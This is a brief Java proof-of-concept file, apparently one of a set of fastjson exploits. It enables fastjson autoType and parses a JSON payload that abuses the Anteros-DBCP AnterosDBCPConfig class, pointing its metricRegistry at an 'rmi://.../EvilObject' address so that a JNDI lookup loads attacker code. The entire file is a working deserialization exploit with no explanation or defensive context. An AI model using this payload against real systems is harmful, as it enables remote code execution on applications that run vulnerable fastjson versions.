import br.com.anteros.dbcp.AnterosDBCPConfig;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

//@dependency{fastjson:<=1.2.66,Anteros-DBCP,Anteros-Core}
public class anterosdbcpconfig {
    public static  void main(String[] args){
        String payload = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"rmi://127.0.0.1:1099/EvilObject\"}";
        ParserConfig config = new ParserConfig();
        config.getGlobalInstance().setAutoTypeSupport(true);
        Object res = JSON.parse(payload);
    }
}
